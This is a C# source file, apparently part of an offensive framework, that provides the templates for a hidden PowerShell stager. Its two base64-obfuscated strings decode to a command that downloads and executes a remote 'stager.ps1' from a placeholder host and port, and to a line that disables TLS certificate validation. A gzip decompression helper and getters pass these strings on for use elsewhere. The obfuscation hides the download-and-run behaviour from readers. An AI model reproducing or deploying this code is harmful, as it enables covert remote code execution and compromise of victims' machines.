using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace HiddenPowerShellDll
{
    class HiddenPowerShellDllCommand
    {
        static string cmd_template = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(@"aQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAG4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAWwBwAHIAbwB0AG8AXQA6AC8ALwBbAGgAbwBzAHQAXQA6AFsAcABvAHIAdABdAC8AcwB0AGEAZwBlAHIALgBwAHMAMQAnACkAKQA="));
        static string ssl_ver_dis = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(@"WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7AA=="));

        public static string DeCompress(string Base64Text)
        {
            byte[] gzBuffer = Convert.FromBase64String(Base64Text);

            using (MemoryStream ms = new MemoryStream())
            {
                int msgLength = BitConverter.ToInt32(gzBuffer, 0);
                ms.Write(gzBuffer, 4, gzBuffer.Length - 4);

                byte[] buffer = new byte[msgLength];

                ms.Position = 0;
                using (GZipStream zip = new GZipStream(ms, CompressionMode.Decompress))
                {
                    zip.Read(buffer, 0, buffer.Length);
                }

                return Encoding.UTF8.GetString(buffer);
            }
        }

        public static String getCommand()
        {
            return cmd_template;
        }

        public static String getPreamble()
        {
            return ssl_ver_dis;
        }
    }
}
